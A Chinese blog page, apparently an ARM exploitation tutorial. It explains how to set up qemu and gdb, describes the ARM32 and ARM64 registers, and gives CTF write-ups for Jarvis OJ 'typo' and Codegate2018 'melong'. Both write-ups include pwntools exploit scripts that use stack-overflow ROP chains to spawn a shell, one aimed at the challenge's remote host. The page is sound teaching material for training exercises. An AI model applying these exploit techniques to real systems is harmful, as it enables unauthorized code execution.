@@ -1,0 +1,1658 @@
+<!DOCTYPE html>
+<html lang="">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="HackPluto">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="HackPluto">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content>
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>ARM pwn入门 · HackPluto&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">HackPluto&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">ARM pwn入门</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href="/">HackPluto's Blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/2.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            ARM pwn入门
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class="post-intro-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="arm,pwn">arm,pwn</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">2.4k</span>阅读时长: <span class="post-count reading-time">10 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2020/04/26</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="ARM-PWN"><a href="#ARM-PWN" class="headerlink" title="ARM PWN"></a>ARM PWN</h1><h2 id="环境搭建-基于Ubuntu18-04"><a href="#环境搭建-基于Ubuntu18-04" class="headerlink" title="环境搭建(基于Ubuntu18.04)"></a>环境搭建(基于Ubuntu18.04)</h2><ul>
+<li><p>安装 git，gdb 和 gdb-multiarch</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get update</span><br><span class="line">$ sudo apt-get install git gdb gdb-multiarch</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>安装qemu</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install qemu-user</span><br><span class="line">$ sudo apt-get install qemu-<span class="keyword">use</span>-<span class="title">binfmt</span> <span class="title">qemu</span>-<span class="title">user</span>-<span class="title">binfmt</span>:<span class="title">i386</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>安装共享库</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install libc6-arm64-cross</span><br><span class="line">sudo apt install libc6-armel-cross</span><br><span class="line">sudo apt install libc6-armhf-cross</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>静态链接的 binary 直接运行即可，会自动调用对应架构的 qemu；<br>动态链接的 bianry 需要用对应的 qemu 同时指定共享库路径</p>
+<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="32位ARM指令集"><a href="#32位ARM指令集" class="headerlink" title="32位ARM指令集"></a>32位ARM指令集</h3><p>Arm32位是ARMV7架构，32位的<br>常见寄存器及作用<br><img src="https://img-blog.csdn.net/20160506002154520" alt></p>
+<ul>
+<li>r0:参数1，返回时作为返回值1用，通用寄存器1</li>
+<li>r1:参数2，返回值，通用寄存器2</li>
+<li>r2:参数3，通用寄存器</li>
+<li>r3:参数4，通用寄存器</li>
+<li>r4 ~ r8:变量寄存器1，2，3，4，5</li>
+<li>r7(补充):系统调用时，存放系统调用号，有时也用于作为FP使用。</li>
+<li>r9:平台寄存器，该寄存器的意义由平台标准定义</li>
+<li>r10,r11:变量寄存器</li>
+<li>r11:主要作为FP使用，FP又叫frame pointer即栈基指针，主要在函数中保存当前函数的栈起始位置，用于堆栈回溯</li>
+<li>r12:内部过程调用寄存器</li>
+<li>r13:栈寄存器SP，主要用于指向当前程序栈顶，配合指令pop/push等</li>
+<li>r14:link寄存器，主要用于存放函数的返回地址，即当前函数返回时，知道自己该回到哪儿去继续运行，通常这个是和BL/BLX/CALL指令搭配，这几个指令被调用后，默认会自动将当前调用指令的下一条指令地址保存到LR寄存器当中</li>
+<li>r15:PC，主要用于存放CPU取指的地址</li>
+</ul>
+<p><strong>使用规则：</strong></p>
+<blockquote>
+<p>1、当参数少于4个时，子程序间通过寄存器R0-R3来传递参数；当参数个数多于4个时，将多余的参数通过数据栈进行传递，入栈顺序与参数顺序正好相反，子程序返回前无需恢复R0~R3的值；<br>2、在子程序中，使用R4~R11保存局部变量，若使用需要入栈保存，子程序返回前需要恢复这些寄存器；R12是临时寄存器，使用不需要保存。<br>3、ATPCS规定堆栈是满递减堆栈FD；满递增堆栈：堆栈指针指向最后压入的数据，且堆栈由高地址向低地址方向增长<br>4、子程序返回32位的整数，使用R0返回；返回64位整数时，使用R0返回低位，R1返回高位。</p>
+</blockquote>
+<p><strong>32位下 NEON寄存器：</strong></p>
+<ul>
+<li>32个S寄存器，S0~S31,（单字，32bit）</li>
+<li>32个D寄存器，D0~D31，（双字，64bit）</li>
+<li>16个Q寄存器，Q0~Q15，（四字，128bit）</li>
+</ul>
+<p><img src="https://img-blog.csdn.net/20180921160117517?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvYXJpbmdMZWVfZmlnaHRpbmc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt></p>
+<blockquote>
+<p>1、NEON寄存器将每个寄存器均视为一个向量，该向量又包含1，2，4，8或16个大小和类型均相同的元素。也可以将各个元素当做标量访问。<br>NEON的这三种寄存器是重叠的，物理地址是一样的。<br>2、NEON寄存器在使用时，如果用到d8~d15寄存器，需要先入栈保存vpush {d8-d15}，使用完之后要出栈vpop {d8-d15}</p>
+</blockquote>
+<h3 id="64位ARM指令集"><a href="#64位ARM指令集" class="headerlink" title="64位ARM指令集"></a>64位ARM指令集</h3><p>ARM64位采用ARMv8架构，64位操作长度<br>ARM架构64位寄存器：<br>31个通用寄存器X0-X30,以及SP（x31）和PC，共33个。其中W0-W31分别是X0~X31的低32位，如下图所示：<br><img src="https://img-blog.csdn.net/20180822213240381?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvYXJpbmdMZWVfZmlnaHRpbmc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt><br>寄存器调用规则如下：</p>
+<ul>
+<li>X0~X7：用于传递子程序参数和结果，使用时不需要保存，多余参数采用堆栈传递，64位返回结果采用X0表示，128位返回结果采用X1:X0表示。<br>X8：用于保存子程序返回地址， 尽量不要使用 。<br>X9~X15：临时寄存器，使用时不需要保存。<br>X16~X17：子程序内部调用寄存器，使用时不需要保存，尽量不要使用。<br>X18：平台寄存器，它的使用与平台相关，尽量不要使用。<br>X19~X28：临时寄存器，使用时必须保存。<br>X29：帧指针寄存器，用于连接栈帧，使用时需要保存。<br>X30：链接寄存器LR<br>X31：堆栈指针寄存器SP或零寄存器ZXR</li>
+</ul>
+<blockquote>
+<p>子程序调用时必须要保存的寄存器：X19-X29和SP(X31)。<br>不需要保存的寄存器：X0-X7,X9-X15</p>
+</blockquote>
+<p><strong>64位下NEON寄存器：</strong></p>
+<ul>
+<li>32个B寄存器（B0~B31）,8bit</li>
+<li>32个H寄存器（H0~H31）,半字 16bit</li>
+<li>32个S寄存器（S0~S31）,单子 32bit</li>
+<li>32个D寄存器（D0~D31）,双字 64bit</li>
+<li>32个Q寄存器（V0~V31）,四字 128bit</li>
+</ul>
+<p>不同位数下寄存器之间的关系如下图所示：<br><img src="https://img-blog.csdn.net/20180822213447950?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvYXJpbmdMZWVfZmlnaHRpbmc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt></p>
+<h2 id="Jarvis-oj-typo"><a href="#Jarvis-oj-typo" class="headerlink" title="Jarvis oj - typo"></a>Jarvis oj - typo</h2><p><a href="https://github.com/bash-c/pwn_repo/tree/master/jarvisOJ_typo" target="_blank" rel="noopener">题目链接</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec typo        </span><br><span class="line">[*] <span class="string">'/home/pluto/\xe6\xa1\x8c\xe9\x9d\xa2/pwn/arm_pwn/typo'</span></span><br><span class="line">    Arch:     arm<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x8000</span>)</span><br></pre></td></tr></table></figure>
+<p>32位的ARM，保护只开了NX<br><img src="https://cdn.jsdelivr.net/gh/HackPluto/bokepicture@master/uPic/whA6WG.png" alt="whA6WG"><br>IDA解析出来没有符号表，但是可以通过start函数定位到main函数的地址是sub_8f00</p>
+<h3 id="还原符号表"><a href="#还原符号表" class="headerlink" title="还原符号表"></a>还原符号表</h3><p>因为这个题没有符号表的信息，所以使用<a href="https://github.com/fireundubh/IDA7-Rizzo/blob/master/rizzo.py" target="_blank" rel="noopener">Rizzo</a>进行符号表修复,先将这个脚本拷贝到IDA的这个目录下<br><img src="https://cdn.jsdelivr.net/gh/HackPluto/bokepicture@master/uPic/zfk7Bf.png" alt="zfk7Bf"><br>再用IDA加载so文件<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/arm-linux-gnueabi/lib/libc<span class="number">-2.27</span>.so</span><br></pre></td></tr></table></figure></p>
+<p>在IDA的file—&gt;Produce file—&gt;Rizzo signature file中使用Rizzo导出符号表文件。</p>
+<p>然后加载题目文件，在IDA的file—&gt;Load file—&gt;Rizzo signature file中使用Rizzo导出加载我们刚才导出的符号表文件<br><img src="https://cdn.jsdelivr.net/gh/HackPluto/bokepicture@master/uPic/oOQ5lj.png" alt="oOQ5lj"><br>可以看到已经解析出了system函数的地址</p>
+<h3 id="定位漏洞点"><a href="#定位漏洞点" class="headerlink" title="定位漏洞点"></a>定位漏洞点</h3><p>ARM下基本都是栈的漏洞，但是这个题的二进制文件在IDA中反汇编的的确不好，很多函数都没有识别出来，所以我的方法是，先通过字符串定位到一些可以的函数，然后逐个去找，就找到了这个漏洞函数<br><img src="https://cdn.jsdelivr.net/gh/HackPluto/bokepicture@master/uPic/4K4lGs.png" alt="4K4lGs"><br>这里存在栈溢出，因为开启了NX，所以使用ROP<br>这里已经知道了溢出点，需要覆盖的长度是0x70<br><img src="https://cdn.jsdelivr.net/gh/HackPluto/bokepicture@master/uPic/ZR0mrA.png" alt="ZR0mrA"><br>因为我们已经知道了system函数的位置，所以就不用找system了</p>
+<h3 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">"l"</span>:</span><br><span class="line">	p = process(<span class="string">"./typo"</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">"d"</span>:</span><br><span class="line">	p = process([<span class="string">"qemu-arm"</span>, <span class="string">"-g"</span>, <span class="string">"1234"</span>, <span class="string">"./typo"</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9888</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Input ~ if you want to quit"</span>)</span><br><span class="line">p.send(<span class="string">"\n"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"------Begin------\n"</span>)</span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x0006c384</span></span><br><span class="line">pop_r0 = <span class="number">0x00020904</span></span><br><span class="line">system_addr = <span class="number">0x110B4</span></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x70</span> + p32(pop_r0) + p32(binsh) * <span class="number">2</span> + p32(system_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="Codegate2018-melong"><a href="#Codegate2018-melong" class="headerlink" title="Codegate2018 - melong"></a>Codegate2018 - melong</h2><p><a href="https://github.com/bash-c/pwn_repo/tree/master/Codegate2018_Melong" target="_blank" rel="noopener">题目链接</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec melong </span><br><span class="line">[*] <span class="string">'/home/pluto/\xe6\xa1\x8c\xe9\x9d\xa2/pwn/arm_pwn/melong'</span></span><br><span class="line">    Arch:     arm<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x10000</span>)</span><br></pre></td></tr></table></figure></p>
+<p>同样只开了NX</p>
+<h3 id="寻找漏洞点"><a href="#寻找漏洞点" class="headerlink" title="寻找漏洞点"></a>寻找漏洞点</h3><p><img src="https://cdn.jsdelivr.net/gh/HackPluto/bokepicture@master/uPic/PykGBy.png" alt="PykGBy"><br>write函数存在潜在的栈溢出，如果我们可以控制nbytes的值，这个值由第一个参数决定，第一个参数又是PT函数的返回值，我们进入PT函数分析<br><img src="https://cdn.jsdelivr.net/gh/HackPluto/bokepicture@master/uPic/sDGkIA.png" alt="sDGkIA"><br>接着查看exc2的值<br>我们可以发现exc2的初始化在get_result函数，如果a2是1，就不会改变exc2的值<br><img src="https://cdn.jsdelivr.net/gh/HackPluto/bokepicture@master/uPic/o45UpG.png" alt="o45UpG"><br>这个参数在第一次调用的时候刚好就是1<br><img src="https://cdn.jsdelivr.net/gh/HackPluto/bokepicture@master/uPic/hvo1iy.png" alt="hvo1iy"><br>所以我们先调用check，使exc2的值不要变，也就是0，接着调用PT，我们可以输入一个负数比如，-1,这样malloc就会返回0，最后v0以-1返回，接着调用write函数，这里read的参数是无符号整数，所以相当于是一个任意长度的读。<br>这个题因为没有system函数，所以需要先使用ROP leak出libc的地址，这个就和X86下的步骤一样了<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">"l"</span>:</span><br><span class="line">	p = process([<span class="string">"qemu-arm"</span>, <span class="string">"-L"</span>, <span class="string">"/usr/arm-linux-gnueabi"</span>,<span class="string">"./melong"</span>])</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">"d"</span>:</span><br><span class="line">	p = process([<span class="string">"qemu-arm"</span>, <span class="string">"-L"</span>, <span class="string">"/usr/arm-linux-gnueabi"</span>,<span class="string">"-g"</span>, <span class="string">"1234"</span>, <span class="string">"./melong"</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9888</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./melong"</span>)</span><br><span class="line">libc=ELF(<span class="string">"/usr/arm-linux-gnueabi/lib/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(a,b)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Type the number:"</span>,<span class="string">"1"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Your height(meters) :"</span>)</span><br><span class="line">	p.sendline(a)</span><br><span class="line">	p.recvuntil(<span class="string">"Your weight(kilograms) :"</span>)</span><br><span class="line">	p.sendline(b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pt</span><span class="params">(a)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Type the number:"</span>,<span class="string">"3"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"How long do you want to take personal training?"</span>)</span><br><span class="line">	p.sendline(a)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">w_rite</span><span class="params">(a)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Type the number:"</span>,<span class="string">"4"</span>)</span><br><span class="line">	p.sendline(a)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">out</span><span class="params">()</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Type the number:"</span>,<span class="string">"6"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_r0 = <span class="number">0x00011bbc</span></span><br><span class="line">check(<span class="string">"12.0"</span>,<span class="string">"12.0"</span>)</span><br><span class="line">pt(<span class="string">"-1"</span>)</span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x54</span> + p32(pop_r0) + p32(elf.got[<span class="string">'puts'</span>]) + p32(elf.plt[<span class="string">'puts'</span>]) + p32(elf.sym[<span class="string">'main'</span>])</span><br><span class="line">w_rite(payload)</span><br><span class="line">out()</span><br><span class="line">base = u32(p.recvn(<span class="number">4</span>)) - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">binsh = base + libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">sys = base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">success(<span class="string">"[*]%s  [*]%s"</span>%(hex(binsh),hex(sys)))</span><br><span class="line">rop = <span class="string">"a"</span>*<span 